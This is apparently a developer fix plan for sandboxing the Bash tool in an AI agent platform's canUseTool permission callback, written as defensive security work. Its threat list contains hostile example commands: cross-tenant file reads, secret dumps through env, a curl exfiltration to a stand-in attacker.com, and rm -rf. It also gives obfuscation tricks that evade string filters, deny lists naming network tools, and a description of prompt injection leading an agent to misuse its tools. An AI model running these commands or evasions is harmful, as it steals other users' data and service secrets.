---
title: "fix: sandbox Bash tool in canUseTool callback"
type: fix
date: 2026-03-20
---

# fix: sandbox Bash tool in canUseTool callback

## Overview

The `canUseTool` callback in `apps/web-platform/server/agent-runner.ts` (lines 160-214) sandboxes file-system tools (`Read`, `Write`, `Edit`, `Glob`, `Grep`) by validating that `file_path` / `path` starts with the user's `workspacePath`. However, the `Bash` tool is not checked at all -- it falls through to the unconditional `return { behavior: "allow" as const }` at line 213. This allows the agent to execute arbitrary shell commands: read files outside the workspace, access other users' data, exfiltrate environment variables, or pivot laterally across workspaces.

**Severity:** CRITICAL (P0). The agent runs inside a Docker container as a non-root `soleur` user (UID 1001), which limits blast radius to container-level, but within that container every user workspace is accessible and `process.env` secrets (Supabase service role key, BYOK decryption key material) are in memory.

**Discovered:** Code review of PR #721. Pre-existing since the MVP commit (`5b8e242`).

Closes #724.

## Problem Statement / Motivation

The Agent SDK's `canUseTool` callback is the **only runtime security boundary** between user workspaces on the web platform. The current implementation creates a false sense of security: file-system tools are sandboxed, but the Bash tool -- which can read any file, write anywhere, and execute any binary available in the container -- is unrestricted. An agent prompt injection or a poorly-constrained domain leader could:

1. `cat /workspaces/<other-user-id>/knowledge-base/**` -- cross-tenant data access
2. `env | grep SUPABASE` -- exfiltrate service role key
3. `curl -X POST https://attacker.com -d "$(cat /workspaces/*/...)"` -- data exfiltration (container has network access)
4. `rm -rf /workspaces/<other-user-id>/` -- destructive cross-tenant action

## Proposed Solution

Add Bash tool validation to the `canUseTool` callback with a **command allowlist + path validation** approach. The Bash tool input object has a `command` field (string) containing the shell command the agent wants to execute.

### Approach: Allowlisted command prefixes + workspace-scoped `cd`

Rather than attempting to parse arbitrary shell commands (which is fragile -- shell syntax is Turing-complete), use a layered defense:

1. **Add `"Bash"` to the sandboxed tool check** in `canUseTool`
2. **Validate the `command` field** against a strict allowlist of safe command patterns
3. **Prefix all allowed commands with `cd <workspacePath> &&`** via `updatedInput` to ensure workspace scoping
4. **Deny commands containing workspace-escape patterns** (absolute paths outside workspace, `../` traversal, pipe to `curl`/`wget`/`nc`, environment variable reads of sensitive keys)

### Alternative considered: `disallowedTools: ["Bash"]`

The simplest fix is to block Bash entirely via `disallowedTools: ["Bash"]` in the `query()` options. This eliminates the attack surface completely. However, the spike findings (`spike/FINDINGS.md` line 14) confirmed the agent uses Bash to self-correct when file paths are wrong, and the domain leaders (CMO, CTO, etc.) may need Bash for `git` operations in the knowledge-base. Blocking Bash entirely degrades agent capability significantly.

### Alternative considered: `permissionMode: "plan"`

Setting `permissionMode: "plan"` prevents all tool execution. This is too restrictive -- the domain leaders need to read and write knowledge-base files to function.

### Alternative considered: `permissionMode: "dontAsk"` + explicit `allowedTools`

Set `permissionMode: "dontAsk"` with `allowedTools: ["Read", "Write", "Edit", "Glob", "Grep", "AskUserQuestion", "Agent"]`. This denies Bash (and any other unlisted tool) without needing `canUseTool` for it. The problem: `allowedTools` **pre-approves** tools, bypassing `canUseTool` entirely. The workspace path validation in `canUseTool` for Read/Write/Edit would stop firing. This trades one security hole for another.

### Recommended hybrid approach

Combine `canUseTool` validation for all tools (file-system AND Bash) with defense-in-depth:

1. **`canUseTool`**: Validate Bash commands against an allowlist. Validate file-system tool paths (existing behavior).
2. **`disallowedTools`**: Block tools that should never be available (`WebSearch`, `WebFetch`) to reduce attack surface.
3. **Container-level**: The existing non-root user (UID 1001) and read-only plugin mount limit blast radius.

### `apps/web-platform/server/agent-runner.ts` changes

Extract the sandbox logic into a dedicated function `sandboxBashCommand(command: string, workspacePath: string): { allowed: boolean; reason?: string; rewrittenCommand?: string }` that:

1. **Rejects** commands containing:
   - Absolute paths not under `workspacePath` (e.g., `/etc/passwd`, `/workspaces/other-user`)
   - Path traversal (`../` that escapes workspace when resolved)
   - Sensitive environment variable access (`$SUPABASE_SERVICE_ROLE_KEY`, `$ANTHROPIC_API_KEY`, `env`, `printenv`, `set`)
   - Network exfiltration commands (`curl`, `wget`, `nc`, `ncat`, `socat`)
   - Dangerous destructive commands targeting paths outside workspace (`rm -rf /`)
   - Process inspection (`ps`, `/proc`)
   - Command substitution that could bypass checks (`eval`, backticks wrapping denied commands)

2. **Allows** commands that are:
   - Workspace-relative (no absolute paths, or absolute paths under `workspacePath`)
   - Common safe operations: `ls`, `cat`, `head`, `tail`, `wc`, `sort`, `grep`, `find`, `git`, `mkdir`, `touch`, `cp`, `mv`, `echo`, `date`, `basename`, `dirname`
   - Already constrained to the workspace by the `cwd` option in `query()` (relative paths resolve to workspace)

3. **Rewrites** allowed commands by prepending `cd <workspacePath> &&` to ensure relative paths resolve correctly even if the agent's CWD drifts.

### `apps/web-platform/server/bash-sandbox.ts` (new file)

Extract the Bash validation logic into a separate module for testability:

```typescript
// apps/web-platform/server/bash-sandbox.ts

interface BashSandboxResult {
  allowed: boolean;
  reason?: string;
  rewrittenCommand?: string;
}

export function validateBashCommand(
  command: string,
  workspacePath: string,
): BashSandboxResult {
  // Implementation
}
```

## Technical Considerations

### Shell parsing is inherently fragile

Shell command validation via string matching is a defense-in-depth measure, not a security guarantee. A determined attacker with prompt injection can:
- Use hex escapes: `$'\x63\x61\x74' /etc/passwd` (encodes `cat`)
- Use variable indirection: `x=ca; y=t; $x$y /etc/passwd`
- Use base64: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`

The validation catches common patterns and raises the bar significantly, but **container-level isolation** (non-root user, network policies, filesystem permissions) remains the true security boundary. The `canUseTool` sandbox is defense-in-depth.

### `canUseTool` caching behavior

Per the learning at `knowledge-base/project/learnings/2026-03-16-agent-sdk-spike-validation.md`, the SDK may cache "allow" decisions per-tool-name within a session. If the first Bash command is allowed, subsequent Bash commands might bypass `canUseTool`. This is a known SDK behavior.

**Mitigation:** The `cwd` option in `query()` is set to `workspacePath`, so even if caching bypasses validation, relative commands still resolve within the workspace. The primary risk is absolute-path commands that escape the workspace -- and those would need to pass the first validation to get cached.

**Investigation needed:** Verify whether `canUseTool` caches per-tool-name (e.g., all Bash calls cached after first) or per-tool-name+input (each unique command validated). If per-tool-name, document this as a known limitation and rely on container isolation.

### `.claude/settings.json` interaction

The workspace's `.claude/settings.json` (provisioned by `server/workspace.ts` line 22) currently sets `permissions.allow: ["Read", "Glob", "Grep"]`. Per the SDK's permission evaluation order: Hooks > Deny rules > Permission mode > Allow rules > `canUseTool`. Tools in `permissions.allow` are auto-approved at the "Allow rules" step, bypassing `canUseTool`.

This means **Read, Glob, and Grep bypass the workspace path validation in `canUseTool`**. This is a separate but related vulnerability:
- `Read` with `file_path: "/etc/passwd"` would be auto-approved by settings.json
- `Grep` with `path: "/workspaces/other-user/"` would be auto-approved

**Fix:** Remove `permissions.allow` from the provisioned `settings.json` (set it to an empty array). All tools should flow through `canUseTool` for workspace validation. This requires updating `server/workspace.ts` and its test.

## Acceptance Criteria

- [ ] `Bash` tool calls in `canUseTool` are validated against the workspace path (`apps/web-platform/server/agent-runner.ts`)
- [ ] Commands containing absolute paths outside `workspacePath` are denied with a clear message
- [ ] Commands containing path traversal (`../` escaping workspace) are denied
- [ ] Commands containing sensitive env var access (`env`, `printenv`, `$SUPABASE_*`, `$ANTHROPIC_*`) are denied
- [ ] Commands containing network exfiltration tools (`curl`, `wget`, `nc`) are denied
- [ ] Allowed Bash commands are prepended with `cd <workspacePath> &&` via `updatedInput`
- [ ] Validation logic is extracted to `apps/web-platform/server/bash-sandbox.ts` for unit testing
- [ ] `.claude/settings.json` provisioned by `server/workspace.ts` has empty `permissions.allow` array
- [ ] `workspace.test.ts` is updated to assert empty permissions
- [ ] New `bash-sandbox.test.ts` covers all deny patterns and allow patterns
- [ ] `disallowedTools: ["WebSearch", "WebFetch"]` added to `query()` options to reduce attack surface
- [ ] Existing file-system tool validation in `canUseTool` continues to work unchanged

## Test Scenarios

### Bash sandbox (`bash-sandbox.test.ts`)

- Given a command `ls`, when validated against workspace `/workspaces/user1`, then allowed and rewritten to `cd /workspaces/user1 && ls`
- Given a command `cat /etc/passwd`, when validated, then denied with reason "absolute path outside workspace"
- Given a command `cat /workspaces/other-user/secret.md`, when validated against `/workspaces/user1`, then denied with reason "path outside workspace"
- Given a command `cat ../../etc/passwd`, when validated, then denied with reason "path traversal outside workspace"
- Given a command `git status`, when validated, then allowed (git is a safe command in workspace context)
- Given a command `env`, when validated, then denied with reason "environment variable access"
- Given a command `echo $SUPABASE_SERVICE_ROLE_KEY`, when validated, then denied with reason "sensitive environment variable"
- Given a command `curl https://attacker.com`, when validated, then denied with reason "network access denied"
- Given a command `cat /workspaces/user1/knowledge-base/plans/my-plan.md`, when validated against `/workspaces/user1`, then allowed (absolute path within workspace)
- Given a command with pipe `git log | head -5`, when validated, then allowed (safe piped command)
- Given a command `rm -rf /`, when validated, then denied with reason "destructive command outside workspace"
- Given a command `rm file.txt`, when validated against workspace, then allowed (relative path, workspace-scoped)

### Workspace provisioning (`workspace.test.ts`)

- Given a new user, when workspace is provisioned, then `.claude/settings.json` has `permissions.allow: []` (empty array)

### Integration (manual verification in staging)

- Given a running agent session, when the agent attempts `cat /etc/passwd` via Bash, then the tool call is denied and the agent receives a "Access denied" message
- Given a running agent session, when the agent uses `ls` (relative), then the command succeeds and returns workspace contents

## References & Research

### Internal References

- Vulnerability: `apps/web-platform/server/agent-runner.ts:160-214` (canUseTool callback)
- Settings bypass: `apps/web-platform/server/workspace.ts:22` (DEFAULT_SETTINGS with non-empty allow)
- Spike findings: `spike/FINDINGS.md:14` (Bash tool works), `spike/FINDINGS.md:88` (recommendation to use canUseTool for Bash)
- SDK learning: `knowledge-base/project/learnings/2026-03-16-agent-sdk-spike-validation.md` (canUseTool caching)
- Related security: `knowledge-base/plans/2026-03-20-security-web-platform-nonroot-user-plan.md` (container-level mitigation)
- Existing test pattern: `apps/web-platform/test/workspace.test.ts` (vitest, workspace provisioning tests)

### External References

- [Agent SDK permissions docs](https://platform.claude.com/docs/en/agent-sdk/permissions) -- permission evaluation order: Hooks > Deny rules > Permission mode > Allow rules > canUseTool
- [Agent SDK user input docs](https://platform.claude.com/docs/en/agent-sdk/user-input) -- canUseTool callback returns `{ behavior: "allow", updatedInput }` or `{ behavior: "deny", message }`
- Bash tool input schema: `{ command: string, description?: string, timeout?: number }`
- `disallowedTools` option: denies tools even in `bypassPermissions` mode

### Related Issues

- #724 (this issue)
- PR #721 (where the vulnerability was discovered during code review)
